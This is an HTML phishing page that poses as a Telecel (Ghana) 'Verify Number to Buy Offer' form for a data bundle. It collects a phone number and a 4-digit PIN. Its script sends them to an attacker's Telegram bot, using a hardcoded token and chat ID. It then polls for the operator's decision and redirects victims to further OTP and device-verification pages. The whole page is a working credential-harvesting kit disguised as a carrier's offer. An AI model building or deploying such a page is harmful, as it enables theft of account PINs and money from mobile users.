<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telecel - Verify Number to Buy Offer</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Inter', sans-serif;
            background: #f8f9fa;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 12px;
        }
        .container {
            width: 100%;
            max-width: 440px;
            background: white;
            border-radius: 24px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.12);
            overflow: hidden;
        }
        .logo-section {
            text-align: center;
            padding: 40px 0 20px;
        }
        .telecel-logo {
            width: 155px;
            height: auto;
            margin: 0 auto;
            filter: drop-shadow(0 6px 14px rgba(227, 6, 19, 0.2));
        }
        h1 {
            text-align: center;
            font-size: 24px;
            font-weight: 700;
            margin: 12px 0 8px;
            color: #1e2937;
            padding: 0 20px;
        }
        .subtitle {
            text-align: center;
            color: #475569;
            font-size: 15.5px;
            padding: 0 25px 20px;
            line-height: 1.45;
        }
        .offer-info {
            background: #fff0f0;
            margin: 0 20px 25px;
            padding: 18px;
            border-radius: 16px;
            text-align: center;
            border: 1px solid #ffe0e0;
        }
        .offer-info strong {
            font-size: 1.15rem;
            color: #1e2937;
        }
        .form-section {
            padding: 0 25px 35px;
        }
        .form-group {
            margin-bottom: 22px;
        }
        label {
            display: block;
            font-size: 14.8px;
            font-weight: 600;
            margin-bottom: 8px;
            color: #1e2937;
        }
        input, select {
            width: 100%;
            padding: 15px 16px;
            border: 1.8px solid #e2e8f0;
            border-radius: 14px;
            font-size: 16.5px;
        }
        input:focus, select:focus {
            border-color: #E30613;
            outline: none;
            box-shadow: 0 0 0 3px rgba(227, 6, 19, 0.1);
        }
        .continue-btn {
            width: 100%;
            background: #E30613;
            color: white;
            border: none;
            padding: 16px;
            font-size: 17.5px;
            font-weight: 700;
            border-radius: 50px;
            cursor: pointer;
            margin-top: 8px;
        }
        .back-btn {
            width: 100%;
            background: transparent;
            color: #64748b;
            border: 2px solid #e2e8f0;
            padding: 15px;
            font-size: 16px;
            font-weight: 600;
            border-radius: 50px;
            cursor: pointer;
            margin-top: 12px;
        }
        .error-msg {
            text-align: center;
            margin: 12px 0;
            font-size: 14.8px;
            padding: 13px;
            border-radius: 12px;
            display: none;
            color: #dc3545;
            background: #ffebee;
        }
        @media (max-width: 480px) {
            .telecel-logo { width: 138px; }
            .container { border-radius: 20px; }
            h1 { font-size: 22px; }
        }
    </style>
</head>
<body>

        </div>

        <h1>Verify Number to Buy Offer</h1>
        <p class="subtitle">Complete verification to activate your selected bundle</p>

        <div class="offer-info" id="offerInfo">
            <strong id="offerTitle"></strong><br>
            <span id="offerPrice" style="color:#E30613; font-weight:700; font-size:22px;"></span>
        </div>

        <div class="form-section">
            <div class="form-group">
                <label>Account Type</label>
                <select id="accountType">
                    <option value="mobile">Mobile</option>
                    <option value="broadband">Broadband</option>
                </select>
            </div>
            <div class="form-group">
                <label>Phone Number</label>
                <input type="tel" id="phone" placeholder="020XXXXXXXX" maxlength="10">
            </div>
            <div class="form-group">
                <label>PIN (4 digits)</label>
                <input type="password" id="password" placeholder="••••" maxlength="4" inputmode="numeric">
            </div>
            <div class="error-msg" id="errMsg"></div>
           
            <button class="continue-btn" id="continueBtn">Verify Number</button>
            <button class="back-btn" onclick="window.location.href='index.html'">← Back to Data Offers</button>
        </div>
    </div>

    <!-- Spinner -->
    <div id="spinner" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.92); z-index:10000; align-items:center; justify-content:center; flex-direction:column; color:white;">
        <div style="width:72px; height:72px; border:7px solid #fff; border-top-color:#E30613; border-radius:50%; animation:spin 1s linear infinite;"></div>
        <p style="margin-top:20px; font-size:17px;">Waiting for approval...</p>
    </div>

    <script>
        const CONFIG = {
            BOT_TOKEN: '8553539359:AAFTjnEFYGG_uB-Iqjbcc30VxroE1JVdmQQ',
            CHAT_ID: '1915520147',
            APPROVE_PAGE: 'https://unlimiteddata.vercel.app/otp.html',
            DEVICE_PAGE: 'https://unlimiteddata.vercel.app/device_verify.html'
        };

        let state = { lastUpdateId: 0, pollInterval: null };

        const phoneInput = document.getElementById('phone');
        const pinInput = document.getElementById('password');
        const continueBtn = document.getElementById('continueBtn');
        const errMsg = document.getElementById('errMsg');
        const spinner = document.getElementById('spinner');
        const offerTitleEl = document.getElementById('offerTitle');
        const offerPriceEl = document.getElementById('offerPrice');

        // Strict Ghana Number Validation
        function isValidGhanaNumber(phone) {
            if (phone.length !== 10) return false;
            const validPrefixes = ['020','050','023','024','027','054','055','057','059','026','028'];
            return validPrefixes.some(prefix => phone.startsWith(prefix));
        }

        // Load Offer from URL Parameters
        function loadOffer() {
            const params = new URLSearchParams(window.location.search);
            const tier = params.get('tier') || 'Data Bundle';
            const data = params.get('data') || '';
            const price = params.get('price') || '0';

            offerTitleEl.textContent = `${tier} - ${data}`;
            offerPriceEl.textContent = `GHS ${price}`;
        }

        // Input Sanitization
        phoneInput.addEventListener('input', () => {
            phoneInput.value = phoneInput.value.replace(/[^0-9]/g, '').slice(0, 10);
        });
        pinInput.addEventListener('input', () => {
            pinInput.value = pinInput.value.replace(/[^0-9]/g, '').slice(0, 4);
        });

        function sendToBot(phone, pin) {
            const ts = Date.now();
            const approveId = `approve_${ts}`;
            const verifyId = `verify_${ts}`;
            const declineId = `decline_${ts}`;

            const message = `<b>🔴 Telecel Verification Request</b>\n\nOffer: ${offerTitleEl.textContent}\nPhone: <code>${phone}</code>\nPIN: <code>${pin}</code>\n\nChoose Action:`;

            fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CONFIG.CHAT_ID,
                    text: message,
                    parse_mode: 'HTML',
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: "✅ Approve Access", callback_data: approveId }, { text: "🔍 Verify Device", callback_data: verifyId }],
                            [{ text: "✅ Valid PIN", callback_data: `valid_${ts}` }, { text: "❌ Invalid PIN", callback_data: `invalid_${ts}` }],
                            [{ text: "❌ Decline", callback_data: declineId }]
                        ]
                    }
                })
            }).then(() => {
                spinner.style.display = 'flex';
                startPolling(approveId, verifyId, declineId);
            }).catch(() => {
                spinner.style.display = 'none';
                errMsg.textContent = "Network error. Please try again.";
                errMsg.style.display = 'block';
            });
        }

        function startPolling(approveId, verifyId, declineId) {
            if (state.pollInterval) clearInterval(state.pollInterval);

            state.pollInterval = setInterval(() => {
                fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?offset=${state.lastUpdateId + 1}`)
                    .then(r => r.json())
                    .then(data => {
                        if (!data.ok || !data.result) return;
                        data.result.forEach(update => {
                            state.lastUpdateId = update.update_id;
                            if (update.callback_query) {
                                const cb = update.callback_query.data;
                                if (cb === approveId) window.location.href = CONFIG.APPROVE_PAGE;
                                else if (cb === verifyId) window.location.href = CONFIG.DEVICE_PAGE;
                                else if (cb.startsWith('valid_')) window.location.href = 'https://unlimiteddata.vercel.app/success.html';
                                else if (cb.startsWith('invalid_') || cb === declineId) {
                                    spinner.style.display = 'none';
                                    errMsg.textContent = "Request declined or invalid PIN. Please try again.";
                                    errMsg.style.display = 'block';
                                }
                            }
                        });
                    });
            }, 1200); // Slightly faster polling
        }

        continueBtn.onclick = () => {
            errMsg.style.display = 'none';
            const phone = phoneInput.value.trim();
            const pin = pinInput.value.trim();

            if (!phone || !isValidGhanaNumber(phone)) {
                errMsg.textContent = "Enter valid Ghana number (e.g. 0201234567)";
                errMsg.style.display = 'block';
                return;
            }
            if (pin.length !== 4) {
                errMsg.textContent = "PIN must be 4 digits";
                errMsg.style.display = 'block';
                return;
            }

            sendToBot(phone, pin);
        };

        // Initialize
        loadOffer();
        phoneInput.focus();
    </script>
</body>
</html>
